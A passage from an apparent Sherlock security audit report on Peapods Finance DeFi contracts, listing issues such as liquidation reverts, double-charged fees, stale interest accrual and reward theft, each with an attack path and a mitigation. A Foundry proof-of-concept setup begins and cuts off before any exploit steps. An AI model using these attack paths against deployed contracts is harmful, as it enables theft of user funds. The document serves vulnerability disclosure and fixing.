_collateralForLiquidator = _leftoverCollateral <= 0 ? _userCollateralBalance : (_liquidationAmountInCollateralUnits * (LIQ_PRECISION + dirtyLiquidationFee)) / LIQ_PRECISION;
```
We compute an optimistic collateral for the liquidator which is based on `cleanLiquidationFee`. If the leftover collateral is not below 0, we recompute the collateral for liquidator based on the `dirtyLiquidationFee` which is a value lower than the clean fee (if we take a look at [Fraxlend](https://etherscan.io/address/0x78bb3aec3d855431bd9289fd98da13f9ebb7ef15#code), it is 9000 vs 10000 for the clean fee).

Then, we have this code:
```solidity
if (_leftoverCollateral <= 0) {
                ...
} else if (_leftoverCollateral < minCollateralRequiredOnDirtyLiquidation.toInt256()) {
       revert BadDirtyLiquidation();
}
```
If the leftover collateral is <=, we end up in the first block where we compute shares to adjust. If it is above 0 however, we will revert if we are under `minCollateralRequiredOnDirtyLiquidation`. The issue is that the leftover collateral is still based on the optimistic calculation which results in a much lower leftover collateral, resulting in reverts when the actual leftover collateral is not even close to `minCollateralRequiredOnDirtyLiquidation`.

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. Let's imagine the following state:
- userCollateralBalance = 2.3e18
- dirtyLiquidationFee = 9_000 (based on Fraxlend)
- cleanLiquidationFee = 10_000 (based on Fraxlend)
- `_liquidationAmountInCollateralUnits` is equal to 2e18 based on the shares to liquidate provided by the user
- `minCollateralRequiredOnDirtyLiquidation` is 1.1e17
2. `_optimisticCollateralForLiquidator` will equal `2e18 * (1e5 + 1e4) / 1e5 = 2.2e18`
3. `_leftoverCollateral` equals `2.3e18 - 2.2e18 = 1e17`
4. As it is above 0, we recompute the collateral for liquidator which will equal `2e18 * (1e5 + 9e3) / 1e5 = 2.18e18`
5. As the leftover collateral is 1e17 and the minimum required collateral is 1.1e17, we will revert
6. In reality, the actual leftover collateral is `2.3e18 - 2.18e18 = 1.2e17` as the collateral we will take out from the user is 2.18e18, not 2.2e18

### Impact

Liquidations will revert incorrectly which is an extremely time-sensitive operation, this can lead to bad debt for the protocol

### PoC

_No response_

### Mitigation

Update the leftover collateral based on the new collateral for the liquidator

# Issue M-3: `_protocolFees` can be applied multiple times in `AutoCompoundingPodLp` contract 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/157 

## Found by 
X77, ZoA, pashap9990, pkqs90

### Summary

In the `_processRewardsToPodLp` function, the reward token is swapped to `PAIRED_LP_TOKEN`, and then some of it is paid as `_protocolFees`. The remaining `PAIRED_LP_TOKEN` is swapped to `pod` and `StakingPoolToken`. However, if this swap fails, `PAIRED_LP_TOKEN` remains in the contract as it is.
`PAIRED_LP_TOKEN` can also be reward token, and in case of `PAIRED_LP_TOKEN`, the same operation is done for `balanceOf(PAIRED_LP_TOKEN) - _protocolFees`. 
If the previous reward token is swapped to `PAIRED_LP_TOKEN` and then the swap to `pod` and `StakingPoolToken` fails, the remaining token amount is included in `balanceOf(PAIRED_LP_TOKEN)`, and `_protocolFees` is paid again for this amount..

### Root Cause

If the swap from `PAIRED_LP_TOKEN` to `pod` and `StakingPoolToken` fails, `PAIRED_LP_TOKEN` [remains](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/AutoCompoundingPodLp.sol#L341-L342) in the contract as it is. (let's call this `swapFaildAmount`)

In case of [`PAIRED_LP_TOKEN`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/AutoCompoundingPodLp.sol#L221-L222), the `swapFaildAmount` is included to `IERC20(_token).balanceOf(address(this))` and `IERC20(_token).balanceOf(address(this)) - _protocolFees` is swapped to PodLp while paying protocol fee for `swapFaildAmount` again.
This means that the protocol fee is paid twice for the previous reward token.

For `PAIRED_LP_TOKEN`, if the swap to `pod` and `StakingPoolToken` also fails, the protocol fee will be applied again next time.


### Internal Pre-conditions

swap from `PAIRED_LP_TOKEN` to `pod` fails

### External Pre-conditions

_No response_

### Attack Path

_No response_

### Impact

The protocol fee can be paid multiple times, reducing the reward for users.

### PoC

RewardsTokens = [PAIRED_LP_TOKEN, dai, lpRewardsToken]

1. In prev call of `_processRewardsToPodLp` function:
`lpRewardsToken` is swapped to 50 of `PAIRED_LP_TOKEN`, and 5 is paid for protocol fee. Total protocol fee increases from 0 to 5.
And then the rest 45 of `PAIRED_LP_TOKEN` is used for swap to `Pod` but this swap failed.
`swapFaildAmount` = 45, balance of `PAIRED_LP_TOKEN` = 45, `_protocolFee` = 5
2. 40 of `PAIRED_LP_TOKEN` is distributed to `AutoCompoundingPodLp` contract and the balance of `PAIRED_LP_TOKEN` is increased to 85 from 45.
3. In next call of `_processRewardsToPodLp` function:
80(=85-_protocolFee) of `PAIRED_LP_TOKEN` is used for swap and protocol fee is also paid for the `swapFaildAmount`.

This means for previous `lpRewardsToken` with same worth of 50 `PAIRED_LP_TOKEN`, total paid fee is 50 / 10 + 45 / 10 = 9.5.
To be correct, the fee should be paid only for the newly distributed `PAIRED_LP_TOKEN` of 40.

### Mitigation

The protocol fee must be paid only if the swap to `PodLp` is successful.
Or keep track of the amount of `PAIRED_LP_TOKEN` remaining in the contract if the swap fails.

# Issue M-4: `addInterest` will not update the interest acurately which would enable users to claim rewards for time that they weren't staked inside `LendingAssetVault` 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/171 

## Found by 
JohnTPark24, TessKimy, X77, pkqs90

### Summary

Users would be able to deposit into `LendingAssetVault` and earn interest on the frax lend pair that was generated before they deposited, i.e. claiming rewards for time that they weren't there. This can be further exploited by MEV bots.

This is due to `_updateInterestAndMdInAllVaults` updating on **rate** changes, rather than **share value** ones.

### Root Cause

Notice that there is a difference between the original frax code and the one we have. The difference is that interest is not always added, which would later lead to the issue described bellow:

https://github.com/FraxFinance/fraxlend/blob/main/src/contracts/FraxlendPairCore.sol#L279-L298
```solidity
    function addInterest(...) {
        (, _interestEarned, _feesAmount, _feesShare, _currentRateInfo) = _addInterest();
        if (_returnAccounting) {
            _totalAsset = totalAsset;
            _totalBorrow = totalBorrow;
        }
    }
```

When we deposit we first call `_updateInterestAndMdInAllVaults` to update the interest

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/LendingAssetVault.sol#L106-L110
```solidity
    function deposit(uint256 _assets, address _receiver) external override returns (uint256 _shares) {
        _updateInterestAndMdInAllVaults(address(0));

        // assets * 1e27 / _cbr
        _shares = convertToShares(_assets);

        _deposit(_assets, _shares, _receiver);
    }
```

`_updateInterestAndMdInAllVaults` loop trough all of the vault and calls `addInterest` on each one of them.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/LendingAssetVault.sol#L204-L216
```solidity
    function _updateInterestAndMdInAllVaults(address _vaultToExclude) internal {
        uint256 _l = _vaultWhitelistAry.length;

        for (uint256 _i; _i < _l; _i++) {
            address _vault = _vaultWhitelistAry[_i];
            if (_vault == _vaultToExclude) {
                continue;
            }

            (uint256 _interestEarned,,,,,) = IFraxlendPair(_vault).addInterest(false);
            if (_interestEarned > 0) {
                _updateAssetMetadataFromVault(_vault);
            }
        }
    }
```

Where `addInterest` would add interest only if the new `_rateChange` is at least 0.1% bigger than the old one:

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPairCore.sol#L286-L325
```solidity
        if (
            _currentUtilizationRate != 0
                && _rateChange < _currentUtilizationRate * minURChangeForExternalAddInterest / UTIL_PREC // 0.1%
        ) {
            emit SkipAddingInterest(_rateChange);
            
        } else {
            (, _interestEarned, _feesAmount, _feesShare, _currentRateInfo) = _addInterest();
        }
```

However the issue is in how we calculate it. As we use `totalAsset`, `totalBorrow` and the assets inside our `LendingAssetVault`. However both `totalAsset`, `totalBorrow` were last updated when there was a deposit, withdraw, borrow, etc... and back then the interest was accrued. Meaning that the only "fresh" value we have are the assets inside our `LendingAssetVault`, where this call started, and if they were not updated (no deposits/withdraws) then all of the values we used for interest would be outdated.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPairCore.sol#L286-L325
```solidity
    function addInterest(...) external nonReentrant {
        _currentRateInfo = currentRateInfo;

        uint256 _currentUtilizationRate = _prevUtilizationRate;
        uint256 _totalAssetsAvailable = totalAsset.totalAmount(address(externalAssetVault));
        uint256 _newUtilizationRate = _totalAssetsAvailable == 0 
            ? 0 
            // (1e5 * totalBorrow.amount) / _totalAssetsAvailable
            : (UTIL_PREC * totalBorrow.amount) / _totalAssetsAvailable;

        uint256 _rateChange = _newUtilizationRate > _currentUtilizationRate
            ? _newUtilizationRate - _currentUtilizationRate
            : _currentUtilizationRate - _newUtilizationRate;

        if (
            _currentUtilizationRate != 0
                && _rateChange < _currentUtilizationRate * minURChangeForExternalAddInterest / UTIL_PREC // 0.1%
        ) {
            emit SkipAddingInterest(_rateChange);
            
        } else {
            (, _interestEarned, _feesAmount, _feesShare, _currentRateInfo) = _addInterest();
        }
    }
```

In short this means that we are trying to calculate the new interest change with values that were changed with the last update on interest and never touched afterwards. This of course will lead to the interest being unchanged, as for the only  way `totalBorrow.amount` and `totalAsset.amount` to increase is if there were any interactions or interest updates.

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. There are no interactions (deposit/withdraw/borrow) with frax lend for a few hours or days
2. User deposits, but `_updateInterestAndMdInAllVaults` doesn't update the interest 


Now the user can deposits another small amount or performs any other auction that will trigger `_updateInterestAndMdInAllVaults` to update the interest on all of the vaults, which is possible as the deposit increased `_totalAssets`, which the vault tracks

The user ca just withdraw, the withdraw will update the interest and thus increase the share value.

### Impact

User has claimed rewards for time that he was not staked. This will happen regularly, where the amounts can range from dust to some reasonable MEV money (a couple of bucks).

### PoC

_No response_

### Mitigation

Rely on `previewAddInterest` for if the interest should be worth changing as it would us current numbers and perform the actual math thanks to `_calculateInterest`.

```solidity
        _newCurrentRateInfo = currentRateInfo;
        // Write return values
        InterestCalculationResults memory _results = _calculateInterest(_newCurrentRateInfo);
```

# Issue M-5: Reward tokens could be locked in `VotingPool` contract 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/180 

## Found by 
ZoA

### Summary

Using `VotingPool`, users can stake tokens from the token list set by the owner to earn rewards.
The owner sets the stakeable token and also `IStakingConversionFactor`, which defines the `getConversionFactor` function related to the token.
Looking at the current protocol implementation, `ConversionFactorPTKN` and `ConversionFactorSPTKN` exist together with `VotingPool`.
This means that `PTKN` or `SPTKN` are possible as tokens designated by the owner.
When users stake using `SPTKN`, the `VotingPool` contract receives reward tokens while transferring `SPTKN`.
As a result, some reward tokens will be locked in `VotingPool` contract because of the lack of mechanism handling reward tokens..

### Root Cause

`ConversionFactorPTKN` and [`ConversionFactorSPTKN`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/voting/ConversionFactorSPTKN.sol#L29-L36) exist together with `VotingPool`. This means that `SPTKN` is possible as stakable token.

While [staking](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/voting/VotingPool.sol#L40) and [unstaking](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/voting/VotingPool.sol#L54), `SPTKN` is transferred from and to `VotingPool` contract. This means that some reward tokens are distributed to `VotingPool` contract.

But there is no mechanism of handling reward tokens.

### Internal Pre-conditions

SPTKN is set as stakable token.

### External Pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Reward tokens could be locked in `VotingPool` contract.

### PoC

_No response_

### Mitigation

Introduce mechanism of handling reward tokens.

# Issue M-6: Open fee is overcharged in `_addLeveragePostCallback` function 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/185 

## Found by 
ZoA

### Summary

In the `_addLeveragePostCallback` function, the user pays an open fee proportional to `pairedLpDesired`, which is the amount of `pairedLPToken` that the user has decided to use for `lpAndStakeInPod`.
In fact, there are `pairedLPToken` that are used for `lpAndStakeInPod` and leftover. It is inccorect to pay fees for these leftover tokens.
In short, fees are overpaid by first calculating the fees without any guarantee that all `pairedLPToken`s are used for `lpAndStakeInPod`..

### Root Cause

In the [`_addLeveragePostCallback`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/lvf/LeverageManager.sol#L315-L318) function, the user actually pays by the amount of `pairedLPToken` that he has desired, not by the amount of `pairedLPToken` used for `lpAndStakeInPod`.

`pairedLPToken` reduced by `_openFeeAmt` from the user desired amount , is really used in `lpAndStakeInPod`, and after calling `_lpAndStakeInPod`, `pairedLPToken` remains as much as `_pairedLeftover`.

The amount of `pairedLPToken` used in `lpAndStakeInPod` is returned from `_lpAndStakeInPod` function as the second return value.

```solidity
    function _addLeveragePostCallback(bytes memory _data) internal returns (uint256 _ptknRefundAmt) {
        IFlashLoanSource.FlashData memory _d = abi.decode(_data, (IFlashLoanSource.FlashData));
        (LeverageFlashProps memory _props,) = abi.decode(_d.data, (LeverageFlashProps, bytes));
        (uint256 _overrideBorrowAmt,,) = abi.decode(_props.config, (uint256, uint256, uint256));
        address _pod = positionProps[_props.positionId].pod;
        uint256 _borrowTknAmtToLp = _props.pairedLpDesired;
        // if there's an open fee send debt/borrow token to protocol
        if (openFeePerc > 0) {
            uint256 _openFeeAmt = (_borrowTknAmtToLp * openFeePerc) / 1000;
            IERC20(_d.token).safeTransfer(feeReceiver, _openFeeAmt);
            _borrowTknAmtToLp -= _openFeeAmt;
        }
@>      (uint256 _pTknAmtUsed,, uint256 _pairedLeftover) = _lpAndStakeInPod(_d.token, _borrowTknAmtToLp, _props);
        _ptknRefundAmt = _props.pTknAmt - _pTknAmtUsed;
        ...
    }
```

The user overpays the fee by paying the fee before executing `lpAndStakeInPod`, even though it is not known exactly how much `pairedLPToken` will be used in `lpAndStakeInPod`.
If the user does not accurately calculate the amount of Pod tokens and `pairedLPToken` required for `lpAndStakeInPod` and sets `pairedLpDesired` to a value larger than the amount of Pod tokens, the consequence of overpaying fees is more serious.

### Attack Path

1. User sets the pod token and  `pairedLPToken` amount like this:
   `pTknAmt = 100`, `pairedLpDesired = 140`, `openFeePerc=5%`
2. Amount of `pairedLPToken` is decreased by `openFeeAmt`.
   `_openFeeAmt = 7`, `_borrowTknAmtToLp = pairedLpDesired - _openFeeAmt = 133`
3. After `_lpAndStakeInPod`, remaining `pairedLPToken` amount in contract is `20`. This means real used amount of the pod token and  `pairedLPToken` for `_lpAndStakeInPod` is 100 and 113.
4. User also paid the open fee for the `pairedLPToken` of 20 that was not used for `_lpAndStakeInPod`.

### Impact

Users will pay more open fees than the amount of `pairedLPToken` actually used for `lpAndStakeInPod`.

### Mitigation
- First decrease `_borrowTknAmtToLp` by `openFeePerc` and execute `_lpAndStakeInPod`, and then calculate the open fee again.
```solidity
    function _addLeveragePostCallback(bytes memory _data) internal returns (uint256 _ptknRefundAmt) {
        ...
      if (openFeePerc > 0) {
          uint256 _openFeeAmt = (_borrowTknAmtToLp * openFeePerc) / 1000;
--          IERC20(_d.token).safeTransfer(feeReceiver, _openFeeAmt);
          _borrowTknAmtToLp -= _openFeeAmt;
      }
--    (uint256 _pTknAmtUsed,, uint256 _pairedLeftover) = _lpAndStakeInPod(_d.token, _borrowTknAmtToLp, _props);
++    (uint256 _pTknAmtUsed, uint256 _pairedLpUsed, uint256 _pairedLeftover) = _lpAndStakeInPod(_d.token, _borrowTknAmtToLp, _props);

++      if (openFeePerc > 0) {
++          _openFeeAmt = (_pairedLpUsed * openFeePerc) / 1000;
++          IERC20(_d.token).safeTransfer(feeReceiver, _openFeeAmt);
++      }
        ...
    }
```

- Or calculate the open fee based on the amount really used for `_lpAndStakeInPod`.

```solidity
    function _addLeveragePostCallback(bytes memory _data) internal returns (uint256 _ptknRefundAmt) {
        ...
--      if (openFeePerc > 0) {
--          uint256 _openFeeAmt = (_borrowTknAmtToLp * openFeePerc) / 1000;
--          IERC20(_d.token).safeTransfer(feeReceiver, _openFeeAmt);
--          _borrowTknAmtToLp -= _openFeeAmt;
--      }
--    (uint256 _pTknAmtUsed,, uint256 _pairedLeftover) = _lpAndStakeInPod(_d.token, _borrowTknAmtToLp, _props);
++    (uint256 _pTknAmtUsed, uint256 _pairedLpUsed, uint256 _pairedLeftover) = _lpAndStakeInPod(_d.token, _borrowTknAmtToLp, _props);

        uint256 _aspTknCollateralBal = _spTknToAspTkn(IDecentralizedIndex(_pod).lpStakingPool(), _pairedLeftover, _props);

        uint256 _flashPaybackAmt = _d.amount + _d.fee;
        uint256 _borrowAmt = _overrideBorrowAmt > _flashPaybackAmt ? _overrideBorrowAmt : _flashPaybackAmt;

++      _borrowAmt += (_pairedLpUsed * openFeePerc) / 1000

        address _aspTkn = _getAspTkn(_props.positionId);
        IERC20(_aspTkn).safeTransfer(positionProps[_props.positionId].custodian, _aspTknCollateralBal);
        LeveragePositionCustodian(positionProps[_props.positionId].custodian).borrowAsset(
            positionProps[_props.positionId].lendingPair, _borrowAmt, _aspTknCollateralBal, address(this)
        );

++      if (openFeePerc > 0) {
++          uint256 _openFeeAmt = (_borrowTknAmtToLp * openFeePerc) / 1000;
++          IERC20(_d.token).safeTransfer(feeReceiver, _openFeeAmt);
++      }
        ...
    }
```

# Issue M-7: The attacker can steal rewards from AutoCompoundingPodLP because in _processRewardsToPodLp, the rewards from TokenRewards are not distributed 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/233 

## Found by 
Schnilch, ZoA, silver\_eth

### Summary

Since the rewards from TokenRewards are not distributed in `_processRewardsToPodLp`, an attacker can deposit into AutoCompoundingPodLp in a single transaction, then distribute the rewards, and subsequently withdraw, receiving a portion of the rewards that were not intended for them.

### Root Cause

AutoCompoundingPodLp uses `_processRewardsToPodLp` to convert (compound) the rewards it receives from the TokenRewards contract into spTKNs. The problem here is that at the beginning of this function, the rewards from TokenRewards are not distributed, which can lead to these rewards being compounded too late.
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L213-L231
In this code snippet, you can see that rewards are not distributed anywhere in the function.

The important point here is that if there is more than one rewards token, rewards are distributed, because `_tokenToPodLp` is called for the tokens with a non-zero balance. Since `_tokenToPodLp` converts the reward token into `spTKN`, rewards are distributed because when `spTKN` is sent to `AutoCompoundingPodLp`, `setShares` in `TokenRewards` is triggered, which then distributes the rewards:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/TokenRewards.sol#L113-L116
In this case, the rewards are indeed in AutoCompoundingPodLp, but since `_tokenToPodLp` has already been called for some reward tokens, not all of these rewards are immediately compounded. This leads to some rewards remaining in AutoCompoundingPodLp, which can be stolen by an attacker.

But if there are no rewards (`_bal` of all reward tokens is 0) in the AutoCompoundingLp at all, distribute will not be called, even if there are multiple reward tokens, because `_tokenToPodLp` simply would not be called since there is nothing to compound.

### Internal Pre-conditions

1. TokenRewards must have some rewards for an attacker to be able to steal them

### External Pre-conditions

No external pre-conditions

### Attack Path

1. It is assumed that there are rewards in TokenRewards for AutoCompoundingPodLp that have not yet been distributed. Currently, there are no rewards in AutoCompoundingPodLp.
2. An attacker sees this and now deposits spTKN into AutoCompoundingPodLp. Since there are no tokens in Auto Compounding PdLp, the rewards are only distributed when the spTKNs deposited by the attacker are transferred at the end of the function, because this is when `setShares` is called, and thus rewards are distributed.
3. In the same transaction, he calls redeem, which, through `_processRewardsToPodLp`, causes the rewards to be compounded into spTKNs. As a result, the rewards are then in the contract as spTKNs, and upon redeeming, he receives a portion of the rewards and has more spTKNs than at the beginning.

### Impact

An attacker can steal rewards from AutoCompoundingPodLp that are actually meant for users who stake their spTKNs there. As a result, these users receive fewer rewards.

### PoC

1. To execute the POC, a `POC.t.sol` file should be created in `contracts/test/POC.t.sol`.
2. The following code should be inserted into the file:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {console} from "forge-std/console.sol";

// forge
import {Test} from "forge-std/Test.sol";

// PEAS
import {PEAS} from "../../contracts/PEAS.sol";
import {V3TwapUtilities} from "../../contracts/twaputils/V3TwapUtilities.sol";
import {UniswapDexAdapter} from "../../contracts/dex/UniswapDexAdapter.sol";
import {IDecentralizedIndex} from "../../contracts/interfaces/IDecentralizedIndex.sol";
import {WeightedIndex} from "../../contracts/WeightedIndex.sol";
import {StakingPoolToken} from "../../contracts/StakingPoolToken.sol";
import {LendingAssetVault} from "../../contracts/LendingAssetVault.sol";
import {IndexUtils} from "../../contracts/IndexUtils.sol";
import {IIndexUtils} from "../../contracts/interfaces/IIndexUtils.sol";
import {IndexUtils} from "../contracts/IndexUtils.sol";
import {RewardsWhitelist} from "../../contracts/RewardsWhitelist.sol";
import {TokenRewards} from "../../contracts/TokenRewards.sol";

// oracles
import {ChainlinkSinglePriceOracle} from "../../contracts/oracle/ChainlinkSinglePriceOracle.sol";
import {UniswapV3SinglePriceOracle} from "../../contracts/oracle/UniswapV3SinglePriceOracle.sol";
import {DIAOracleV2SinglePriceOracle} from "../../contracts/oracle/DIAOracleV2SinglePriceOracle.sol";
import {V2ReservesUniswap} from "../../contracts/oracle/V2ReservesUniswap.sol";
import {aspTKNMinimalOracle} from "../../contracts/oracle/aspTKNMinimalOracle.sol";

// protocol fees
import {ProtocolFees} from "../../contracts/ProtocolFees.sol";
import {ProtocolFeeRouter} from "../../contracts/ProtocolFeeRouter.sol";

// autocompounding
import {AutoCompoundingPodLpFactory} from "../../contracts/AutoCompoundingPodLpFactory.sol";
import {AutoCompoundingPodLp} from "../../contracts/AutoCompoundingPodLp.sol";

// lvf
import {LeverageManager} from "../../contracts/lvf/LeverageManager.sol";

// fraxlend
import {FraxlendPairDeployer, ConstructorParams} from "./invariant/modules/fraxlend/FraxlendPairDeployer.sol";
import {FraxlendWhitelist} from "./invariant/modules/fraxlend/FraxlendWhitelist.sol";
import {FraxlendPairRegistry} from "./invariant/modules/fraxlend/FraxlendPairRegistry.sol";
import {FraxlendPair} from "./invariant/modules/fraxlend/FraxlendPair.sol";
import {VariableInterestRate} from "./invariant/modules/fraxlend/VariableInterestRate.sol";
import {IERC4626Extended} from "./invariant/modules/fraxlend/interfaces/IERC4626Extended.sol";

// flash
import {IVault} from "./invariant/modules/balancer/interfaces/IVault.sol";
import {BalancerFlashSource} from "../../contracts/flash/BalancerFlashSource.sol";
import {PodFlashSource} from "../../contracts/flash/PodFlashSource.sol";
import {UniswapV3FlashSource} from "../../contracts/flash/UniswapV3FlashSource.sol";

// uniswap-v2-core
import {UniswapV2Factory} from "v2-core/UniswapV2Factory.sol";
import {UniswapV2Pair} from "v2-core/UniswapV2Pair.sol";

// uniswap-v2-periphery
import {UniswapV2Router02} from "v2-periphery/UniswapV2Router02.sol";

// uniswap-v3-core
import {UniswapV3Factory} from "v3-core/UniswapV3Factory.sol";
import {UniswapV3Pool} from "v3-core/UniswapV3Pool.sol";

// uniswap-v3-periphery
import {SwapRouter02} from "swap-router/SwapRouter02.sol";
import {LiquidityManagement} from "v3-periphery/base/LiquidityManagement.sol";
import {PeripheryPayments} from "v3-periphery/base/PeripheryPayments.sol";
import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";

// mocks
import {WETH9} from "./invariant/mocks/WETH.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./invariant/mocks/MockERC20.sol";
import {TestERC20} from "./invariant/mocks/TestERC20.sol";
import {TestERC4626Vault} from "./invariant/mocks/TestERC4626Vault.sol";
import {MockV3Aggregator} from "./invariant/mocks/MockV3Aggregator.sol";
import {MockUniV3Minter} from "./invariant/mocks/MockUniV3Minter.sol";
import {MockV3TwapUtilities} from "./invariant/mocks/MockV3TwapUtilities.sol";

import {PodHelperTest} from "./helpers/PodHelper.t.sol";

contract AuditTests is PodHelperTest {
    address alice = vm.addr(uint256(keccak256("alice")));
    address bob = vm.addr(uint256(keccak256("bob")));
    address charlie = vm.addr(uint256(keccak256("charlie")));

    uint256[] internal _fraxPercentages = [10000, 2500, 7500, 5000];

    // fraxlend protocol actors
    address internal comptroller = vm.addr(uint256(keccak256("comptroller")));
    address internal circuitBreaker = vm.addr(uint256(keccak256("circuitBreaker")));
    address internal timelock = vm.addr(uint256(keccak256("comptroller")));

    uint16 internal fee = 100;
    uint256 internal PRECISION = 10 ** 27;

    uint256 donatedAmount;
    uint256 lavDeposits;

    /*///////////////////////////////////////////////////////////////
                            TEST CONTRACTS
    ///////////////////////////////////////////////////////////////*/

    PEAS internal _peas;
    MockV3TwapUtilities internal _twapUtils;
    UniswapDexAdapter internal _dexAdapter;
    LendingAssetVault internal _lendingAssetVault;
    LendingAssetVault internal _lendingAssetVault2;
    RewardsWhitelist internal _rewardsWhitelist;

    // oracles
    V2ReservesUniswap internal _v2Res;
    ChainlinkSinglePriceOracle internal _clOracle;
    UniswapV3SinglePriceOracle internal _uniOracle;
    DIAOracleV2SinglePriceOracle internal _diaOracle;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Peas;
    aspTKNMinimalOracle internal _aspTKNMinOracle1Weth;

    // protocol fees
    ProtocolFees internal _protocolFees;
    ProtocolFeeRouter internal _protocolFeeRouter;

    // pods
    WeightedIndex internal _pod1Peas;

    // index utils
    IndexUtils internal _indexUtils;

    // autocompounding
    AutoCompoundingPodLpFactory internal _aspTKNFactory;
    AutoCompoundingPodLp internal _aspTKN1Peas;
    address internal _aspTKN1PeasAddress;

    // lvf
    LeverageManager internal _leverageManager;

    // fraxlend
    FraxlendPairDeployer internal _fraxDeployer;
    FraxlendWhitelist internal _fraxWhitelist;
    FraxlendPairRegistry internal _fraxRegistry;
    VariableInterestRate internal _variableInterestRate;

    FraxlendPair internal _fraxLPToken1Peas;

    // flash
    UniswapV3FlashSource internal _uniswapV3FlashSourcePeas;

    // mocks
    MockUniV3Minter internal _uniV3Minter;
    MockERC20 internal _mockDai;
    WETH9 internal _weth;
    MockERC20 internal _tokenA;
    MockERC20 internal _tokenB;
    MockERC20 internal _tokenC;

    // uniswap-v2-core
    UniswapV2Factory internal _uniV2Factory;
    UniswapV2Pair internal _uniV2Pool;

    // uniswap-v2-periphery
    UniswapV2Router02 internal _v2SwapRouter;

    // uniswap-v3-core
    UniswapV3Factory internal _uniV3Factory;
    UniswapV3Pool internal _v3peasDaiPool;
    UniswapV3Pool internal _v3peasDaiFlash;

    // uniswap-v3-periphery
    SwapRouter02 internal _v3SwapRouter;

    function setUp() public override {
        super.setUp();

        _deployUniV3Minter();
        _deployWETH();
        _deployTokens();
        _deployPEAS();
        _deployUniV2();
        _deployUniV3();
        _deployProtocolFees();
        _deployRewardsWhitelist();
        _deployTwapUtils();
        _deployDexAdapter();
        _deployIndexUtils();
        _deployWeightedIndexes();
        _deployAutoCompoundingPodLpFactory();
        _getAutoCompoundingPodLpAddresses();
        _deployAspTKNOracles();
        _deployAspTKNs();
        _deployVariableInterestRate();
        _deployFraxWhitelist();
        _deployFraxPairRegistry();
        _deployFraxPairDeployer();
        _deployFraxPairs();
        _deployLendingAssetVault();
        _deployLeverageManager();
        _deployFlashSources();
        
        _mockDai.mint(alice, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
        _peas.transfer(alice, 100_000 ether);
        _peas.transfer(bob, 100_000 ether);
        _peas.transfer(charlie, 100_000 ether);
    }

    function _deployUniV3Minter() internal {
        _uniV3Minter = new MockUniV3Minter();
    }

    function _deployWETH() internal {
        _weth = new WETH9();

        vm.deal(address(this), 1_000_000 ether);
        _weth.deposit{value: 1_000_000 ether}();

        vm.deal(address(_uniV3Minter), 2_000_000 ether);
        vm.prank(address(_uniV3Minter));
        _weth.deposit{value: 2_000_000 ether}();
    }

    function _deployTokens() internal {
        _mockDai = new MockERC20();
        _tokenA = new MockERC20();
        _tokenB = new MockERC20();
        _tokenC = new MockERC20();

        _mockDai.initialize("MockDAI", "mDAI", 18);
        _tokenA.initialize("TokenA", "TA", 18);
        _tokenB.initialize("TokenB", "TB", 18);
        _tokenC.initialize("TokenC", "TC", 18);

        _tokenA.mint(address(this), 1_000_000 ether);
        _tokenB.mint(address(this), 1_000_000 ether);
        _tokenC.mint(address(this), 1_000_000 ether);
        _mockDai.mint(address(this), 1_000_000 ether);

        _tokenA.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenB.mint(address(_uniV3Minter), 1_000_000 ether);
        _tokenC.mint(address(_uniV3Minter), 1_000_000 ether);
        _mockDai.mint(address(_uniV3Minter), 1_000_000 ether);

        _tokenA.mint(alice, 1_000_000 ether);
        _tokenB.mint(alice, 1_000_000 ether);
        _tokenC.mint(alice, 1_000_000 ether);
        _mockDai.mint(alice, 1_000_000 ether);

        _tokenA.mint(bob, 1_000_000 ether);
        _tokenB.mint(bob, 1_000_000 ether);
        _tokenC.mint(bob, 1_000_000 ether);
        _mockDai.mint(bob, 1_000_000 ether);

        _tokenA.mint(charlie, 1_000_000 ether);
        _tokenB.mint(charlie, 1_000_000 ether);
        _tokenC.mint(charlie, 1_000_000 ether);
        _mockDai.mint(charlie, 1_000_000 ether);
    }

    function _deployPEAS() internal {
        _peas = new PEAS("Peapods", "PEAS");
        _peas.transfer(address(_uniV3Minter), 2_000_000 ether);
    }

    function _deployUniV2() internal {
        _uniV2Factory = new UniswapV2Factory(address(this));
        _v2SwapRouter = new UniswapV2Router02(address(_uniV2Factory), address(_weth));
    }

    function _deployUniV3() internal {
        _uniV3Factory = new UniswapV3Factory();
